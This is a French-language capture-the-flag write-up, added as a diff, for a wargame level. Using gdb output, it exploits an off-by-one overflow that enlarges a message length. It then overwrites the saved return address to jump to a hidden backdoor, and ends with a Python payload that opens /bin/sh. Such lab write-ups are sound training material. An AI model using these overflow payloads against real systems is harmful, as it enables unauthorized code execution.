@@ -1,0 +1,131 @@
+On voit que le programme demande un username, puis un message, et l'envoie:
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: rostroh
+>: Welcome, rostroh
+>: Msg @Unix-Dude
+>>: hello
+>: Msg sent!
+
+Sous gdb, on voit que le programme declare une structure dans la fonction handle_msg.
+   0x00005555555548c4 <+4>:		sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+=> 0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+
+Nous allons etudier un peu plus cette structure en details:
+cette instruction nous indique que nous allons passer les 140 (0x80) premiers bytes de la structure:
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+Nous pouvons en deduire que la premiere variable est un array de 140 bytes.
+Ensuite, on voit que 5 QWORD consecutifs sont set a 0 avec les instructions:
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+Un QWORD etant sur 8 bytes, en faisant 8*5, nous pouvons facilement imaginer qu'il s'agit d'un bzero sur un buffer de 40 bytes.
+Puis, l'instruction:
+=> 0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+Nous montre de l'on set un int a 0x8c (140) (vu qu'il fait la taille du premier buffer, nous pouvons imaginer qu'il s'agit de sa taille).
+
+Dans set_username, nous voyons que l'on copie le content d'un fgets dans le deuxieme buffer:
+   x0000555555554a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
+Mais surtout, la condition d'arret est i >= 0x28 alors que le buffer ne faire que 0x28 bytes (on boucle une fois de trop).
+
+Nous devrions pouvoir recrire le premier byte de l'int declare dans la structure en faisant overflow le deuxieme buffer.
+Avant le buffer overflow, on a notre len:
+(gdb) x/bx 0x7fffffffe5c0 - 0xc
+0x7fffffffe5b4:	0x8c
+et apres avoir fait overflow le buffer avec des A:
+(gdb) x/s 0x7fffffffe5b4
+0x7fffffffe5b4:	 "A"
+Nous allons donc modifier la taille du message.
+
+Nous voyons que la fonction set_msg va lire des bytes depuis stdin, puis copier les len premiers bytes dans le premier buffer.
+Nous devrions pouvoir faire overflow le buffer en modifiant la taille copiee par len.
+
+En faisant overflow le buffer "username" avec des 0xff, nous avons:
+(gdb) x/x 0x7fffffffe5b4
+0x7fffffffe5b4:	0xff
+
+En regardant info function, nous avons:
+0x0000555555554860  frame_dummy
+0x000055555555488c  secret_backdoor
+0x00005555555548c0  handle_msg
+0x0000555555554932  set_msg
+0x00005555555549cd  set_username
+0x0000555555554aa8  main
+
+Nous voyons une fonction secret_backdoor qui n'est jamais appelee. Cette fonction va lire depuis stdin, puis l'executer avec un system.
+On voit que son adresse est:
+(gdb) x secret_backdoor
+0x55555555488c <secret_backdoor>
+
+Si nous pouvions modifier l'eip apres la lecture du username par la fonction secret_backdoor, nous devrions pouvoir lancer un shell.
+Nous allons donc chercher l'offset du buffer pour recrire l'eip. En faisant un break sur:
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+on a:
+Breakpoint 4, 0x0000555555554910 in handle_msg ()
+(gdb) i r
+rax            0x7fffffffe500	140737488348416
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0x7fffffffe500	140737488348416
+rbp            0x7fffffffe5c0	0x7fffffffe5c0
+rsp            0x7fffffffe500	0x7fffffffe500
+r8             0xffffffff	4294967295
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe6b0	140737488348848
+r14            0x0	0
+r15            0x0	0
+rip            0x555555554910	0x555555554910 <handle_msg+80>
+eflags         0x202	[ IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) i f
+Stack level 0, frame at 0x7fffffffe5d0:
+ rip = 0x555555554910 in handle_msg; saved rip 0x555555554abd
+ called by frame at 0x7fffffffe5e0
+ Arglist at 0x7fffffffe5c0, args:
+ Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
+ Saved registers:
+  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
+
+Sachant qu'rax est l'adresse du premier buffer, on peut calculer l'offset:
+>>> 0x7fffffffe5c8 - 0x7fffffffe500
+200
+
+On va donc ecrire une commande python pour exploit. Etant donner qu'il y a 3 gets a utiliser, on va separer la commande en 3 parties.
+
+Partie 1: Username
+Nous allons faire overflow le 41 octets du buffer pour recrire la size du message:
+python -c 'print "A" * 40 + "\xff"'
+
+Partie 2: Message
+La recriture de l'eip se faisant a partir de l'offset 200, nous allons input 200 octects, puis mettre l'adresse de secret_backdoor:
+python -c 'print "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'
+
+Partie 3: System
+On va juste ecrire "/bin/sh":
+python -c 'print "/bin/sh"'
+
+Afin de pouvoir tout input dans une seule commande, on va utiliser le comportement de fgets. En effet, il arrete la lecture a chaque \n. Nous allons faire une seule commande python, en mettant un \n entre parties:
+python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh"'
+
